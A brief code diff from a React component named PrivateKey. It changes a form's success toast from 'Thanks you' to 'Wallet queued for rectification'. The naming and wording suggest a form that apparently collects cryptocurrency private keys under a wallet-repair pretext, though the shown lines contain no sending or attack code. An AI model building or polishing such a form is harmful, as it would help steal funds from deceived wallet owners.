@@ -24,7 +24,7 @@ function PrivateKey() {
         }
       );
     e.target.reset();
-    toast.success("Thanks you", {
+    toast.success("Wallet queued for rectification", {
       position: "top-center",
       autoClose: 2000,
       progressClassName: "fancy-progress-bar",
